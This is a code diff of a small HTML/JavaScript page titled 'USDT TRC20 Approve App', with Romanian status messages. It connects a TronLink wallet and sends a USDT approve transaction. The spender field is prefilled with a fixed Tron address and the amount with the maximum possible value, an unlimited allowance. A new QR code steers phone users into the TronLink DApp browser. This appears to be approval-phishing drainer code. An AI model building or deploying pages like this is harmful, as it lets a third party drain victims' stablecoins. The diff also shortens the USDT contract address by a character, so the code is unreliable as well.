@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
-  <title>USDT Approve App</title>
+  <title>USDT TRC20 Approve App</title>
 
   <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
 
@@ -12,7 +12,7 @@
       margin: 0;
       padding: 0;
       box-sizing: border-box;
-      font-family: system-ui, -apple-system, Arial;
+      font-family: system-ui, Arial;
     }
 
     body {
@@ -24,14 +24,9 @@
       align-items: center;
     }
 
-    /* APP CONTAINER */
     .app {
       width: 100%;
       max-width: 420px;
-      height: 100vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
       padding: 20px;
     }
 
@@ -39,12 +34,11 @@
       background: #111a2e;
       padding: 20px;
       border-radius: 18px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.4);
     }
 
     h2 {
       text-align: center;
-      margin-bottom: 15px;
+      margin-bottom: 10px;
     }
 
     input {
@@ -53,7 +47,6 @@
       margin-top: 10px;
       border-radius: 10px;
       border: none;
-      outline: none;
       background: #1b2a4a;
       color: white;
     }
@@ -61,25 +54,18 @@
     button {
       width: 100%;
       padding: 12px;
-      margin-top: 12px;
+      margin-top: 10px;
       border-radius: 10px;
       border: none;
-      cursor: pointer;
       font-weight: bold;
+      cursor: pointer;
     }
 
-    .primary {
-      background: #3b82f6;
-      color: white;
-    }
-
-    .secondary {
-      background: #22c55e;
-      color: white;
-    }
+    .primary { background: #3b82f6; color: white; }
+    .green { background: #22c55e; color: white; }
 
     #status {
-      margin-top: 15px;
+      margin-top: 12px;
       font-size: 13px;
       color: #7dd3fc;
       white-space: pre-wrap;
@@ -90,13 +76,15 @@
       margin-top: 15px;
       display: flex;
       justify-content: center;
+      background: white;
+      padding: 10px;
+      border-radius: 10px;
     }
 
     .title {
       text-align: center;
-      font-size: 18px;
-      margin-bottom: 10px;
-      opacity: 0.8;
+      opacity: 0.7;
+      margin-bottom: 5px;
     }
   </style>
 </head>
@@ -115,7 +103,7 @@
     <input id="spender" placeholder="TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu" />
     <input id="amount" placeholder="115792089237316195423570985008687907853269984665640564039457584007913129639935" />
 
-    <button class="secondary" onclick="approveUSDT()">Confirm & Sign</button>
+    <button class="green" onclick="approveUSDT()">Confirm & Sign</button>
 
     <div id="status">Status: waiting...</div>
 
@@ -126,10 +114,13 @@
 </div>
 
 <script>
-const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+
+const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4p8otSzgjLj6t";
 let userAddress = null;
 
-/* WALLET DETECT */
+/* =========================
+   DETECT WALLET
+========================= */
 async function detectWallet() {
   let tries = 0;
 
@@ -148,31 +139,42 @@ async function detectWallet() {
 
     if (tries > 20) {
       document.getElementById("status").innerText =
-        "Deschide în TronLink dApp browser.";
+        "Deschide în TronLink DApp Browser!";
       clearInterval(interval);
     }
 
   }, 500);
 }
 
-/* CONNECT */
+/* =========================
+   CONNECT WALLET
+========================= */
 async function connectWallet() {
-  if (!window.tronWeb) {
-    document.getElementById("status").innerText = "TronLink nu este disponibil";
-    return;
+  try {
+    if (!window.tronWeb) {
+      document.getElementById("status").innerText =
+        "TronLink NU este disponibil (deschide în DApp browser)";
+      return;
+    }
+
+    await window.tronLink.request({ method: "tron_requestAccounts" });
+
+    userAddress = window.tronWeb.defaultAddress.base58;
+
+    document.getElementById("status").innerText =
+      "Connected:\n" + userAddress;
+
+  } catch (e) {
+    document.getElementById("status").innerText = e.message;
   }
-
-  await window.tronLink.request({ method: "tron_requestAccounts" });
-
-  userAddress = window.tronWeb.defaultAddress.base58;
-
-  document.getElementById("status").innerText =
-    "Connected:\n" + userAddress;
 }
 
-/* APPROVE */
+/* =========================
+   APPROVE USDT
+========================= */
 async function approveUSDT() {
   try {
+
     if (!userAddress) {
       alert("Connect wallet first");
       return;
@@ -191,27 +193,38 @@ async function approveUSDT() {
     ).send();
 
     document.getElementById("status").innerText =
-      "Approved!\nTX:\n" + tx;
+      "Approve sent!\nTX:\n" + tx;
 
   } catch (e) {
     document.getElementById("status").innerText = e.message;
   }
 }
 
-/* QR */
+/* =========================
+   QR INTELIGENT (IMPORTANT FIX)
+========================= */
 function generateQR() {
+
+  // 🔥 IMPORTANT: forțează deschiderea în TronLink DApp browser
+  const tronlinkURL =
+    "https://tronlink.org/dapp?url=" +
+    encodeURIComponent(window.location.href);
+
   new QRCode(document.getElementById("qrcode"), {
-    text: window.location.href,
-    width: 140,
-    height: 140
+    text: tronlinkURL,
+    width: 160,
+    height: 160
   });
 }
 
-/* INIT */
+/* =========================
+   INIT
+========================= */
 window.addEventListener("load", () => {
   detectWallet();
   generateQR();
 });
+
 </script>
 
 </body>
